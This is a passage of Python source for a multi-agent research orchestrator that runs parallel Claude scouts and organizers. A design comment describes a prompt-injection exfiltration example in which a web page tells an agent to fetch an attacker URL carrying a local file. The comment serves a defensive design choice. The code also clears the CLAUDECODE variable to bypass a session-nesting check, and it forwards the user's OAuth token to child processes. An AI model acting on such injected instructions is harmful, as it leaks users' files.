"""
Oracle SDK v4.7.0 — Multi-tier research orchestrator (Claude Agent SDK).

  Phase 1: Smiths (N*10 parallel Haiku) -> web tools (WebSearch, WebFetch, optional
           GitHub MCP); local file tools (Read/Grep/Glob) only with --local
  Phase 2: Anderson (N parallel Sonnet) -> each sees ONLY its chain's Smiths, no truncation
  Multi-chain: all Anderson reports returned directly to the caller (no merger phase).

Prompts are piped via stdin as JSON. The calling session (Claude Code)
generates the prompts using its full conversation context — no Architect needed.

Fallback: if stdin is a TTY (no piped data), uses a built-in Architect (Sonnet)
to decompose the question.

Usage:
  /oracle question                          # Claude Code builds prompts, pipes them in
  echo '[...]' | python -m claude_oracle    # direct stdin
  python -m claude_oracle "question"        # fallback: Architect decomposes
"""

import asyncio
import json
import os
import shutil
import sys
import tempfile
import time
from dataclasses import dataclass, field

from claude_agent_sdk import query, ClaudeAgentOptions

from .rounds import DEFAULT_ROUNDS, RoundSession

# Fix Windows console encoding (guarded: stdout/stderr may be a pipe or a
# capture object without .reconfigure — importing the package must not crash).
if sys.platform == "win32":
    for _stream in (sys.stdout, sys.stderr):
        try:
            _stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

# Auto-clear CLAUDECODE env var so SDK can launch from inside a CC session
if "CLAUDECODE" in os.environ:
    del os.environ["CLAUDECODE"]

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------
DEFAULT_CHAINS = 1
MAX_CHAINS = 8
SCOUTS_PER_CHAIN = 10
# Launch gate: concurrent `claude` subprocess startups race on the shared
# ~/.claude.json (non-atomic read-modify-write -> torn file; observed
# 2026-07-12 at 20 Smiths with a 0.25s fixed stagger — 1 crash, 1 hang).
# Instead of guessing a stagger delay, the gate admits ONE subprocess into
# its startup window at a time and opens for the next as soon as the current
# stream emits its first SDK message (proof the startup config I/O settled).
# Adaptive: fast machines ramp in seconds, slow ones stretch automatically.
# A wedged startup (no first message) holds the gate at most this long;
# residual casualties are handled by the retry pass in scout().
STARTUP_GATE_TIMEOUT_S = 10
SCOUT_TIMEOUT_S = 720  # 12 min per Smith — kill hung agents. Raised over time; tool-heavy
                       # searches (many WebSearch/WebFetch/GitHub calls) can legitimately run long.
ANDERSON_TIMEOUT_S = 1200  # 20 min per Anderson — dense multi-chain synthesis can take 500-800s;
                           # raised from 480 after real timeouts on large chains.

# Model identifiers — the MODEL_WEIGHTS keys are the single source of truth;
# reference these constants instead of re-typing the strings (typos would fall
# through MODEL_WEIGHTS.get(model, 1.0) and silently mis-cost the run).
MODEL_HAIKU = "haiku"
MODEL_SONNET = "sonnet"
MODEL_OPUS = "opus"

# Max 20x credit system (source: oreateai.com reverse-engineering, ~Mar 2026)
# Credits = (input_tokens * model_weight) + (output_tokens * model_weight * 5)
# Output costs 5x input. Model weights: Haiku=0.2, Sonnet=1.0, Opus=1.67
# Anthropic can change these at any time — treat as approximate.
SESSION_CREDITS = 11_000_000    # Max 20x 5-hour session
WEEKLY_CREDITS = 83_330_000     # Max 20x 7-day rolling
OUTPUT_MULTIPLIER = 5           # output tokens cost 5x input
CACHE_READ_MULTIPLIER = 0.1     # cached prompt reads bill ~0.1x fresh input
CACHE_WRITE_MULTIPLIER = 1.25   # cache writes bill ~1.25x fresh input
MODEL_WEIGHTS = {MODEL_HAIKU: 0.2, MODEL_SONNET: 1.0, MODEL_OPUS: 1.67}

SCOUT_SUFFIX = (
    "\n\nFor any specific number, state your source and confidence: "
    "HIGH (directly from source), MEDIUM (calculated/derived), LOW (estimated/extrapolated). "
    "Always note the date of your source. Prefer recent sources over older ones. "
    "If a stat is more than 12 months old, flag it as potentially outdated. "
    "Report findings only. You may include code snippets you find, but do NOT build or implement anything."
)


def _normalize_prompts(raw: list[dict]) -> list[dict]:
    """Validate and normalize piped prompts.

    Guarantees every returned prompt carries chain/id/dimension/prompt and the
    standard suffix (without mutating the caller's dicts). Idempotent, so run()
    can safely re-validate library-supplied prompts. Raises ValueError with a
    clear message on structurally invalid input rather than a bare KeyError deep
    in the scout dispatch.
    """
    if not isinstance(raw, list) or not raw:
        raise ValueError("Prompts must be a non-empty JSON array of objects")
    for i, p in enumerate(raw):
        if not isinstance(p, dict) or not str(p.get("prompt", "")).strip():
            raise ValueError(f"Prompt #{i + 1} is missing a non-empty 'prompt' field")

    has_chains = any("chain" in p for p in raw)
    if has_chains:
        # Respect provided chain labels; fill any missing chain/id/dimension so a
        # partially-specified prompt can't KeyError downstream. Copy, don't mutate.
        out = []
        for i, p in enumerate(raw):
            if p.get("_normalized"):
                out.append(p)
                continue
            pid = p.get("id", i + 1)
            out.append({
                **p,
                "chain": p.get("chain", "A"),
                "id": pid,
                "dimension": p.get("dimension", f"dim-{pid}"),
                "prompt": p["prompt"] + SCOUT_SUFFIX,
                "_normalized": True,
            })
        return out

    # Streamlined format: just dimension + prompt. Validate count is a multiple of 10.
    if len(raw) % 10 != 0:
        print(f"  [oracle] WARNING: Got {len(raw)} prompts (not a multiple of 10). "
              f"Expected {((len(raw) // 10) + 1) * 10} for {(len(raw) // 10) + 1} chains.",
              file=sys.stderr)

    # Auto-assign chains of 10
    chains_count = max(1, len(raw) // 10)
    per_chain = 10 if len(raw) >= 10 else len(raw)

    prompts = []
    for i, p in enumerate(raw):
        chain = chr(65 + i // per_chain) if chains_count > 1 else "A"
        prompts.append({
            "chain": chain,
            "id": i + 1,
            "dimension": p.get("dimension", f"dim-{i + 1}"),
            "prompt": p["prompt"] + SCOUT_SUFFIX,
            "_normalized": True,
        })
    return prompts


def _extract_json_array(text: str | None) -> list:
    """Extract a JSON array from LLM text, tolerating ``` fences (with or without
    a trailing newline). Raises ValueError (never IndexError/JSONDecodeError) so
    callers can report a clean error."""
    if not text or not text.strip():
        raise ValueError("empty response")
    text = text.strip()
    if text.startswith("```"):
        # Drop the opening fence (```/```json) whether or not it is on its own line.
        text = text.split("\n", 1)[1] if "\n" in text else text[3:]
        if text.rstrip().endswith("```"):
            text = text.rstrip()[:-3]
        text = text.strip()
    start = text.find("[")
    end = text.rfind("]") + 1
    if start < 0 or end <= start:
        raise ValueError(f"no JSON array found in response: {text[:120]!r}")
    try:
        data = json.loads(text[start:end])
    except json.JSONDecodeError as e:
        raise ValueError(f"invalid JSON array: {e}") from e
    if not isinstance(data, list):
        raise ValueError("parsed JSON is not an array")
    return data


async def _aclose(gen) -> None:
    """Best-effort close of a query() async generator so its subprocess is
    released promptly on timeout/cancellation instead of waiting for GC."""
    aclose = getattr(gen, "aclose", None)
    if aclose is None:
        return
    try:
        await aclose()
    except Exception:
        pass


# Don't hand children a token that could die mid-run: worst case is a queued
# Smith (720s) whose chain's Anderson then runs (1200s), plus slack.
SESSION_TOKEN_MIN_REMAINING_S = 3600


def _credentials_file() -> str:
    """Path of the primary Claude Code credentials store (Windows/Linux file;
    on macOS credentials live in the Keychain and this file may not exist —
    that's fine, callers degrade to gated mode)."""
    base = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(os.path.expanduser("~"), ".claude")
    return os.path.join(base, ".credentials.json")


def _session_access_token() -> str | None:
    """Zero-setup isolation: reuse the user's CURRENT session access token.

    Reads ONLY accessToken + expiresAt — the refresh token never leaves the
    primary store, so spawned children structurally cannot rotate credentials
    or harm the primary login (verified 2026-07-12: a fresh CLAUDE_CONFIG_DIR
    + this token in env authenticates cleanly). Returns None (-> gated mode)
    when the file is absent/malformed or the token has less than
    SESSION_TOKEN_MIN_REMAINING_S of life left."""
    try:
        with open(_credentials_file(), encoding="utf-8") as f:
            oauth = json.load(f).get("claudeAiOauth", {})
        token = oauth.get("accessToken")
        expires_ms = oauth.get("expiresAt") or 0
        if token and expires_ms / 1000 - time.time() > SESSION_TOKEN_MIN_REMAINING_S:
            return token
    except (OSError, ValueError):
        pass
    return None


def _oauth_token() -> str | None:
    """Token used to authenticate isolated child processes, by priority:
    1. ORACLE_OAUTH_TOKEN — explicit, oracle-only (doesn't change how the
       user's interactive `claude` sessions authenticate)
    2. CLAUDE_CODE_OAUTH_TOKEN — a directly exported long-lived token
    3. the current session's access token (zero-setup default; see
       _session_access_token)
    When any is available, Smiths and Andersons each get a private
    CLAUDE_CONFIG_DIR (no shared ~/.claude.json -> no corruption race -> no
    launch gate needed)."""
    return (
        os.environ.get("ORACLE_OAUTH_TOKEN")
        or os.environ.get("CLAUDE_CODE_OAUTH_TOKEN")
        or _session_access_token()
    )


# GitHub MCP — enabled when GITHUB_PAT env var is set (stdio transport only)
def _github_mcp() -> dict | None:
    pat = os.environ.get("GITHUB_PAT")
    if not pat:
        return None
    return {
        "github": {
            "command": "npx",
            # Version-pinned: `npx -y <pkg>` with no version executes whatever
            # the registry serves at runtime — a supply-chain hole for a
            # process holding the user's GITHUB_PAT. Bump deliberately.
            "args": ["-yq", "@modelcontextprotocol/server-github@2025.4.8"],
            "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": pat},
        }
    }


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class UsageStats:
    input_tokens: int = 0
    output_tokens: int = 0
    cache_read_input_tokens: int = 0
    cache_creation_input_tokens: int = 0
    cost_usd: float = 0.0
    quota_units: float = 0.0
    usage_observed: bool = False
    usage_available: bool = False

    def add(self, other: "UsageStats"):
        if not other.usage_observed:
            return
        if not self.usage_observed:
            self.input_tokens = other.input_tokens
            self.output_tokens = other.output_tokens
            self.cache_read_input_tokens = other.cache_read_input_tokens
            self.cache_creation_input_tokens = other.cache_creation_input_tokens
            self.cost_usd = other.cost_usd
            self.quota_units = other.quota_units
            self.usage_observed = True
            self.usage_available = other.usage_available
            return
        self.input_tokens += other.input_tokens
        self.output_tokens += other.output_tokens
        self.cache_read_input_tokens += other.cache_read_input_tokens
        self.cache_creation_input_tokens += other.cache_creation_input_tokens
        self.cost_usd += other.cost_usd
        self.quota_units += other.quota_units
        self.usage_available = self.usage_available and other.usage_available

    @property
    def total_tokens(self) -> int:
        return (
            self.input_tokens
            + self.output_tokens
            + self.cache_read_input_tokens
            + self.cache_creation_input_tokens
        )

    @property
    def session_pct(self) -> float:
        return (self.quota_units / SESSION_CREDITS) * 100 if SESSION_CREDITS else 0

    @property
    def weekly_pct(self) -> float:
        return (self.quota_units / WEEKLY_CREDITS) * 100 if WEEKLY_CREDITS else 0

    def __str__(self) -> str:
        if self.usage_observed and not self.usage_available:
            return "usage unavailable"
        return f"{self.total_tokens:,} tok ({self.weekly_pct:.2f}% weekly)"


def _unknown_usage() -> UsageStats:
    """Represent a model attempt whose provider did not return usage data."""
    return UsageStats(usage_observed=True)


@dataclass
class ScoutResult:
    scout_id: int
    chain: str
    dimension: str
    result_text: str
    error: str | None = None
    duration_ms: int = 0
    usage: UsageStats = field(default_factory=_unknown_usage)


@dataclass
class CompressorResult:
    chain: str
    summary: str
    error: str | None = None
    duration_ms: int = 0
    usage: UsageStats = field(default_factory=_unknown_usage)
    # When Anderson fails (timeout / exception), the orchestrator stashes the
    # raw scout outputs here so the report can fall back to them instead of
    # discarding 10 Smiths' worth of work. Recovery becomes "redo Anderson",
    # not "redo all Smiths."
    fallback_scouts: list["ScoutResult"] | None = None


@dataclass
class OracleMetrics:
    start_time: float = 0
    phase_times: dict = field(default_factory=dict)
    phase_usage: dict = field(default_factory=lambda: {
        "decompose": UsageStats(),
        "scout": UsageStats(),
        "compress": UsageStats(),
    })
    scout_count: int = 0
    scout_errors: int = 0
    compressor_count: int = 0
    compressor_errors: int = 0
    chain_count: int = 0

    @property
    def total_time(self) -> float:
        return time.time() - self.start_time if self.start_time else 0

    @property
    def total_usage(self) -> UsageStats:
        total = UsageStats()
        for u in self.phase_usage.values():
            total.add(u)
        return total


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _extract_usage(message, model: str = MODEL_SONNET) -> UsageStats:
    """Extract usage stats and compute quota units based on model weight."""
    stats = _unknown_usage()
    if hasattr(message, "total_cost_usd") and message.total_cost_usd is not None:
        stats.cost_usd = message.total_cost_usd
    if hasattr(message, "usage") and message.usage is not None:
        usage = message.usage
        fields = (
            "input_tokens",
            "output_tokens",
            "cache_read_input_tokens",
            "cache_creation_input_tokens",
        )
        values = {}
        for field_name in fields:
            if hasattr(usage, field_name):
                values[field_name] = getattr(usage, field_name)
            elif isinstance(usage, dict):
                values[field_name] = usage.get(field_name)
        stats.usage_available = any(value is not None for value in values.values())
        for field_name, value in values.items():
            setattr(stats, field_name, value or 0)
    weight = MODEL_WEIGHTS.get(model, 1.0)
    # Cached prompt tokens are billed at a discount/premium relative to fresh
    # input. These ratios mirror Anthropic's published API cache pricing and are
    # approximate for the subscription credit system — as with MODEL_WEIGHTS,
    # treat as an estimate. Counting a cache read as full-price input overstates
    # the dominant term: a real Anderson turn showed input_tokens=3 against
    # cache_read_input_tokens=3,040.
    billable_input = (
        stats.input_tokens
        + stats.cache_read_input_tokens * CACHE_READ_MULTIPLIER
        + stats.cache_creation_input_tokens * CACHE_WRITE_MULTIPLIER
    )
    stats.quota_units = (billable_input + stats.output_tokens * OUTPUT_MULTIPLIER) * weight
    return stats


# ---------------------------------------------------------------------------
# Oracle SDK
# ---------------------------------------------------------------------------
class OracleSDK:
    def __init__(
        self,
        chains: int = DEFAULT_CHAINS,
        verbose: bool = False,
        show_dollars: bool = False,
        local_tools: bool = False,
        progress_callback=None,
    ):
        if chains < 1 or chains > MAX_CHAINS:
            raise ValueError(f"Chains must be 1-{MAX_CHAINS}, got {chains}")
        self.chains = chains
        self.scouts_total = chains * SCOUTS_PER_CHAIN
        self.verbose = verbose
        self.show_dollars = show_dollars
        # Scouts are web-only by default: they process untrusted web content
        # non-interactively, and Read+WebFetch together form a prompt-injection
        # exfiltration channel (page says "fetch evil.com/?q=<local file>").
        # Local file tools are granted only when the caller opts in for
        # questions about the local codebase.
        self.local_tools = local_tools
        self.metrics = OracleMetrics()
        self.planned_prompts: list[dict] = []
        self.progress_callback = progress_callback
        self._active_scouts: dict[int, str] = {}  # scout_id -> status
        self._progress_totals = {"scouts": self.scouts_total, "organizers": self.chains}
        self._completed_organizers = 0
        self._has_architect = False  # set when Architect phase runs
        self._iso_root: str | None = None  # per-run base dir for isolated configs

    def log(self, msg: str):
        if self.verbose:
            print(f"  [oracle] {msg}", file=sys.stderr)

    def status(self, msg: str):
        """Always-on status line (not gated by verbose)."""
        print(f"  [oracle] {msg}", file=sys.stderr)

    def _scouts_remaining(self) -> int:
        """Count scouts not yet in a terminal state (single source for the
        'N left' progress line, so the success and timeout paths agree)."""
        return sum(1 for s in self._active_scouts.values() if s not in ("done", "error", "timeout"))

    def _emit_progress(self, phase: str) -> None:
        """Publish best-effort live progress without affecting model work."""
        if self.progress_callback is None:
            return
        terminal = {"done", "error", "timeout"}
        update = {
            "phase": phase,
            "progress": {
                "scouts": {
                    "completed": sum(status in terminal for status in self._active_scouts.values()),
                    "total": self._progress_totals["scouts"],
                },
                "organizers": {
                    "completed": self._completed_organizers,
                    "total": self._progress_totals["organizers"],
                },
            },
        }
        try:
            self.progress_callback(update)
        except Exception as exc:
            self.log(f"  progress update unavailable: {exc}")

    def _phase(self, name: str) -> str:
        """Return 'Phase N/T -- name' with correct numbering."""
        order = []
        if self._has_architect:
            order.append("architect")
        order.append("smiths")
        order.append("anderson")
        idx = order.index(name) + 1
        return f"Phase {idx}/{len(order)} -- "

    @staticmethod
    def _raw_smith_fallback(scouts: list["ScoutResult"]) -> str:
        """Render raw Smith outputs verbatim (used when Anderson synthesis fails
        but the underlying scouts succeeded — recovery is 're-run Anderson')."""
        return "\n\n".join(
            f"### Smith #{s.scout_id} — {s.dimension}\n"
            + (f"(error: {s.error})" if s.error else (s.result_text or ""))
            for s in scouts
        )

    # ----- Config isolation -----

    def _isolated_env(self, label: str) -> dict | None:
        """Environment for one subprocess with a private CLAUDE_CONFIG_DIR.

        Requires token auth (_oauth_token): credentials are scoped to the
        config dir (verified 2026-07-12 — a fresh dir reports "Not logged
        in"), so the token must ride along in env. Copying .credentials.json
        instead would be dangerous: access tokens live ~1h, so parallel
        long-running copies WILL refresh independently, and refresh-token
        rotation could invalidate the primary login. Returns None when no
        token is available — caller stays in shared-config gated mode.
        """
        token = _oauth_token()
        if not token:
            return None
        if self._iso_root is None:
            self._iso_root = tempfile.mkdtemp(prefix="oracle-iso-")
        cfg_dir = os.path.join(self._iso_root, label)
        os.makedirs(cfg_dir, exist_ok=True)
        return {**os.environ, "CLAUDE_CONFIG_DIR": cfg_dir, "CLAUDE_CODE_OAUTH_TOKEN": token}

    def _cleanup_isolation(self) -> None:
        """Remove the per-run isolated config dirs (throwaway state only —
        the report and metrics live in this process, not in those dirs)."""
        if self._iso_root:
            shutil.rmtree(self._iso_root, ignore_errors=True)
            self._iso_root = None

    # ----- Architect (fallback) -----

    async def decompose(self, question: str) -> list[dict]:
        """Fallback: use Sonnet to decompose question when no prompts piped via stdin."""
        self._has_architect = True
        self.status(f"{self._phase('architect')}Architect ({self.chains} chains of {SCOUTS_PER_CHAIN} Smiths)")
        t0 = time.time()

        chain_labels = [chr(65 + i) for i in range(self.chains)]  # A, B, C, ...

        prompt = f"""Decompose into exactly {self.scouts_total} sub-prompts across {self.chains} orthogonal chains ({', '.join(chain_labels)}).

QUESTION: {question}

Each sub-prompt: ONE dimension, DIFFERENT search terms, under 200 words.
Confidence/reporting instructions are auto-appended — don't include them.

Return ONLY a JSON array:
{{"chain": "A", "id": 1, "dimension": "short label", "prompt": "text"}}"""

        result_text = ""
        usage = _unknown_usage()
        try:
            gen = query(
                prompt=prompt,
                options=ClaudeAgentOptions(
                    model=MODEL_SONNET,
                    # Decomposition is mechanical JSON emission. Benchmarked
                    # low/medium/high at 24 prompts across 3 chains: all passed
                    # 100% (count, chain balance, distinct dimensions), so the
                    # default `high` bought nothing for 1.7x the tokens.
                    effort="low",
                    allowed_tools=["Read", "Grep", "Glob"],
                    system_prompt="Decompose research questions into orthogonal sub-prompts. Output ONLY valid JSON.",
                ),
            )
            try:
                async for message in gen:
                    if hasattr(message, "result"):
                        result_text = message.result or ""
                        usage = _extract_usage(message, MODEL_SONNET)
            finally:
                await _aclose(gen)
        except Exception as e:
            raise RuntimeError(f"Architect query failed: {e}") from e

        try:
            prompts = _extract_json_array(result_text)
        except ValueError as e:
            raise RuntimeError(f"Architect did not return a valid prompt list: {e}") from e

        elapsed = time.time() - t0
        self.metrics.phase_times["decompose"] = elapsed
        self.metrics.phase_usage["decompose"] = usage
        self.status(f"  Architect designed {len(prompts)} Smiths ({elapsed:.1f}s) | {usage}")
        return prompts

    # ----- Phase 2: Scout -----

    async def _run_scout(self, scout_id: int, chain: str, dimension: str, prompt: str,
                         on_started=None) -> ScoutResult:
        """Run a single Haiku scout with tool access. `on_started` (if given)
        is invoked once, on the first message from the subprocess stream —
        scout() uses it to open the launch gate for the next Smith."""
        t0 = time.time()
        self._active_scouts[scout_id] = "running"
        try:
            result_text = ""
            usage = _unknown_usage()
            last_tool = ""
            # Build MCP config if GitHub PAT is available
            tools = ["WebSearch", "WebFetch"]
            if self.local_tools:
                tools = ["Read", "Grep", "Glob"] + tools
            mcp = _github_mcp()
            opts = {
                "model": MODEL_HAIKU,
                "allowed_tools": tools,
                "disallowed_tools": ["Bash", "Write", "Edit", "NotebookEdit", "Agent"],
                # Scouting is search-and-report, not multi-step reasoning, so the
                # thinking budget bought nothing: benchmarked -26% output tokens
                # with citation breadth unchanged (12.4 -> 13.6 domains) and zero
                # empty results across 5 runs.
                "thinking": {"type": "disabled"},
                # Runaway guard only. Observed working range is 9-23 turns, so
                # this never binds on a healthy Smith — do not lower below 25.
                "max_turns": 30,
            }
            if mcp:
                opts["mcp_servers"] = mcp
                opts["allowed_tools"] = tools + ["mcp__github__*"]
            iso_env = self._isolated_env(f"smith-{scout_id}")
            if iso_env:
                opts["env"] = iso_env

            system = """Research scout. Search thoroughly, report findings concisely, do NOT speculate.

Be dense: facts, numbers, and sources. No filler, no restating the question, no introductions.
Tag every number with confidence: HIGH (primary source), MEDIUM (derived), LOW (estimated).
Flag all LOW-confidence numbers explicitly."""
            if mcp:
                system += """

GitHub MCP tools available — prefer these over WebSearch for repo data:
- mcp__github__search_repositories / search_code — find repos and code
- mcp__github__get_file_contents — read files from repos
- mcp__github__list_issues / list_commits — check activity"""

            gen = query(
                prompt=prompt,
                options=ClaudeAgentOptions(
                    **opts,
                    system_prompt=system,
                ),
            )
            try:
                async for message in gen:
                    if on_started is not None:
                        on_started()
                        on_started = None
                    if hasattr(message, "result"):
                        result_text = message.result or ""
                        usage = _extract_usage(message, MODEL_HAIKU)
                    elif hasattr(message, "last_tool_name") and message.last_tool_name:
                        new_tool = message.last_tool_name
                        if new_tool != last_tool:
                            last_tool = new_tool
                            self.log(f"  Smith #{scout_id} ({chain}/{dimension}): {new_tool}")
            finally:
                await _aclose(gen)

            # An empty result is a failure, not a silent success — otherwise it
            # would pass the all-fail guard and contribute nothing to Anderson.
            if not result_text.strip():
                self._active_scouts[scout_id] = "error"
                self._emit_progress("research")
                elapsed = time.time() - t0
                self.status(f"  Smith #{scout_id} ({chain}/{dimension}) returned EMPTY [{elapsed:.1f}s]")
                return ScoutResult(
                    scout_id=scout_id,
                    chain=chain,
                    dimension=dimension,
                    result_text="",
                    error="Empty result (scout returned no content)",
                    duration_ms=int((time.time() - t0) * 1000),
                    usage=usage,
                )

            self._active_scouts[scout_id] = "done"
            self._emit_progress("research")
            remaining = self._scouts_remaining()
            elapsed = time.time() - t0
            chain_prefix = f"{chain}/" if self.chains > 1 else ""
            self.status(f"  Smith #{scout_id} ({chain_prefix}{dimension}) done [{elapsed:.1f}s, {remaining} left]")

            return ScoutResult(
                scout_id=scout_id,
                chain=chain,
                dimension=dimension,
                result_text=result_text,
                duration_ms=int((time.time() - t0) * 1000),
                usage=usage,
            )
        except Exception as e:
            self._active_scouts[scout_id] = "error"
            self._emit_progress("research")
            self.status(f"  Smith #{scout_id} FAILED ({chain}/{dimension}): {e}")
            return ScoutResult(
                scout_id=scout_id,
                chain=chain,
                dimension=dimension,
                result_text="",
                error=str(e),
                duration_ms=int((time.time() - t0) * 1000),
            )

    async def scout(self, prompts: list[dict]) -> list[ScoutResult]:
        # Launch gate (see STARTUP_GATE_TIMEOUT_S): one subprocess in its
        # startup window at a time. Held from spawn until the first stream
        # message; a watchdog opens it after STARTUP_GATE_TIMEOUT_S so a
        # wedged startup can't stall the whole ramp. Scouts run fully in
        # parallel once past startup. One scout's error never aborts the rest.
        # With token auth (_oauth_token), each subprocess gets a private
        # CLAUDE_CONFIG_DIR instead — no shared file, no race, no gate.
        gate = None if _oauth_token() else asyncio.Semaphore(1)
        mode = "isolated config dirs, ungated" if gate is None else "startups gated one at a time"
        self.status(f"{self._phase('smiths')}Smiths ({self.scouts_total} Haiku, parallel; {mode})")
        t0 = time.time()
        self._active_scouts = {}
        self._emit_progress("research")
        loop = asyncio.get_running_loop()

        async def _scout_with_timeout(p: dict) -> ScoutResult:
            released = gate is None  # isolation mode: nothing to gate

            def _open_gate():
                nonlocal released
                if not released:
                    released = True
                    gate.release()

            gate_timer = None
            if gate is not None:
                await gate.acquire()
                gate_timer = loop.call_later(STARTUP_GATE_TIMEOUT_S, _open_gate)
            try:
                return await asyncio.wait_for(
                    self._run_scout(p["id"], p["chain"], p["dimension"], p["prompt"],
                                    on_started=_open_gate),
                    timeout=SCOUT_TIMEOUT_S,
                )
            except asyncio.TimeoutError:
                self._active_scouts[p["id"]] = "timeout"
                self._emit_progress("research")
                remaining = self._scouts_remaining()
                self.status(f"  Smith #{p['id']} ({p['dimension']}) TIMEOUT [{SCOUT_TIMEOUT_S}s, {remaining} left]")
                return ScoutResult(
                    scout_id=p["id"],
                    chain=p["chain"],
                    dimension=p["dimension"],
                    result_text="",
                    error=f"Timed out after {SCOUT_TIMEOUT_S}s",
                    duration_ms=SCOUT_TIMEOUT_S * 1000,
                )
            except Exception as e:
                sid = p.get("id", -1)
                self._active_scouts[sid] = "error"
                self._emit_progress("research")
                self.status(f"  Smith #{sid} FAILED (dispatch): {e}")
                return ScoutResult(
                    scout_id=sid,
                    chain=p.get("chain", "?"),
                    dimension=p.get("dimension", "?"),
                    result_text="",
                    error=str(e),
                )
            finally:
                # Guaranteed release on every path — including wait_for's
                # cancellation, which `except Exception` cannot catch.
                if gate_timer is not None:
                    gate_timer.cancel()
                _open_gate()

        tasks = [_scout_with_timeout(p) for p in prompts]
        results = list(await asyncio.gather(*tasks))

        # Retry pass: relaunch failed/timed-out Smiths ONCE, serially. The
        # launch storm is over by now, so retries start against a quiet
        # ~/.claude.json — the 2026-07-12 casualties (startup-race crash and
        # hang) would both have recovered here. Skipped when more than half
        # failed: that pattern means something systemic (auth, network), and
        # a serial retry pass would just repeat it slowly.
        failed_idx = [i for i, r in enumerate(results) if r.error]
        if failed_idx and len(failed_idx) <= max(1, len(results) // 2):
            self.status(f"  Retry pass: {len(failed_idx)} failed Smith(s), one serial relaunch each")
            for i in failed_idx:
                p = prompts[i]
                self._active_scouts[p["id"]] = "running"
                try:
                    retry = await asyncio.wait_for(
                        self._run_scout(p["id"], p["chain"], p["dimension"], p["prompt"]),
                        timeout=SCOUT_TIMEOUT_S,
                    )
                except asyncio.TimeoutError:
                    self._active_scouts[p["id"]] = "timeout"
                    self._emit_progress("research")
                    retry = ScoutResult(
                        scout_id=p["id"], chain=p["chain"], dimension=p["dimension"],
                        result_text="", error=f"Timed out after {SCOUT_TIMEOUT_S}s (retry)",
                        duration_ms=SCOUT_TIMEOUT_S * 1000,
                    )
                except Exception as e:
                    self._active_scouts[p["id"]] = "error"
                    self._emit_progress("research")
                    retry = ScoutResult(
                        scout_id=p["id"], chain=p["chain"], dimension=p["dimension"],
                        result_text="", error=f"{e} (retry)",
                    )
                if not retry.error:
                    self.status(f"  Smith #{p['id']} ({p['dimension']}) RECOVERED on retry")
                results[i] = retry
        elif failed_idx:
            self.status(f"  Retry pass SKIPPED: {len(failed_idx)}/{len(results)} Smiths failed (systemic)")

        # Aggregate usage
        phase_usage = UsageStats()
        for r in results:
            if r.error:
                self.metrics.scout_errors += 1
            phase_usage.add(r.usage)

        self.metrics.scout_count = len(results)
        elapsed = time.time() - t0
        self.metrics.phase_times["scout"] = elapsed
        self.metrics.phase_usage["scout"] = phase_usage
        self.status(f"  {len(results)} Smiths returned ({elapsed:.1f}s), {self.metrics.scout_errors} errors | {phase_usage}")
        return results

    # ----- Phase 3: Compress -----

    def _build_scout_data(self, scout_results: list[ScoutResult]) -> str:
        """Build the scout-data block from all successful Smith results. No
        truncation — Anderson runs on Sonnet's large context window."""
        valid = [r for r in scout_results if not r.error]
        if not valid:
            return ""
        parts = [
            f"--- Smith #{r.scout_id} ({r.dimension}) ---\n{r.result_text or ''}"
            for r in valid
        ]
        return "\n\n".join(parts)

    async def _run_compressor(self, chain: str, scout_results: list[ScoutResult]) -> CompressorResult:
        """Run a single Sonnet compressor for one chain."""
        t0 = time.time()

        scout_data = self._build_scout_data(scout_results)
        error_scouts = [r for r in scout_results if r.error]
        if error_scouts:
            scout_data += "\n\n--- Errored Smiths ---\n" + "\n".join(
                f"Smith #{r.scout_id} ({r.dimension}): ERROR - {r.error}"
                for r in error_scouts
            )

        triage = """Triage rules:
- DEDUP: Merge overlapping findings, cite all source Smiths
- RECENCY: Conflicting numbers? Prefer the most recently dated source
- AGREE: Multiple Smiths converge = highest confidence
- DISAGREE: Flag genuine disputes (not just stale vs fresh data)
- GAPS: Note uncovered topics
- CORRECT: Fix obvious errors"""

        prompt = f"""Organize {len(scout_results)} Smith reports{f' (Chain {chain})' if self.chains > 1 else ''} for the calling session's synthesis.

{triage}

{scout_data}

IMPORTANT: Preserve all findings — do NOT cut for brevity. Your output goes directly to the calling session.
Dedup overlapping facts, correct errors, flag disputes, but keep all unique signal.

Output: All findings (grouped by theme, with confidence + Smith #), Corrections, Disputes, Gaps.
Organize, don't compress — the calling session will do the editorial judgment."""

        try:
            result_text = ""
            usage = _unknown_usage()
            anderson_opts = {
                "model": MODEL_SONNET,
                # Biggest single saving in the pipeline (~50% of run spend).
                # Benchmarked at production scale (10 reports x 8K chars) with
                # planted adversarial items: low/medium/high all scored 100% on
                # marker recall, contradiction detection, stale-vs-fresh
                # rejection, and error correction. `high` emitted 3.1x the
                # tokens for identical output — it pads rather than preserving
                # more signal, which contradicts the "organize, don't compress"
                # mandate below.
                "effort": "low",
                "allowed_tools": ["Read", "Grep", "Glob"],
                "system_prompt": "You are Anderson. Organize Smith reports into structured findings. Preserve all unique signal — the calling session handles final synthesis.",
            }
            iso_env = self._isolated_env(f"anderson-{chain}")
            if iso_env:
                anderson_opts["env"] = iso_env
            gen = query(prompt=prompt, options=ClaudeAgentOptions(**anderson_opts))
            try:
                async for message in gen:
                    if hasattr(message, "result"):
                        result_text = message.result or ""
                        usage = _extract_usage(message, MODEL_SONNET)
            finally:
                await _aclose(gen)

            elapsed_ms = int((time.time() - t0) * 1000)
            self.status(f"  Anderson {chain} done ({elapsed_ms / 1000:.1f}s) | {usage}")
            return CompressorResult(
                chain=chain,
                summary=result_text,
                duration_ms=elapsed_ms,
                usage=usage,
            )
        except Exception as e:
            self.status(f"  Anderson {chain} FAILED: {e}")
            return CompressorResult(
                chain=chain,
                summary="",
                error=str(e),
                duration_ms=int((time.time() - t0) * 1000),
            )

    async def compress(self, scout_results: list[ScoutResult]) -> list[CompressorResult]:
        """Dispatch one Sonnet compressor per chain — each sees ONLY its chain's data.
        Chains whose Smiths ALL failed are skipped (no Sonnet call, no fabricated
        report). If Anderson itself fails, the chain's raw Smith outputs are stashed
        as a fallback so the report can preserve them."""
        if self.chains == 1:
            self.status(f"{self._phase('anderson')}Anderson (1 Sonnet)")
        else:
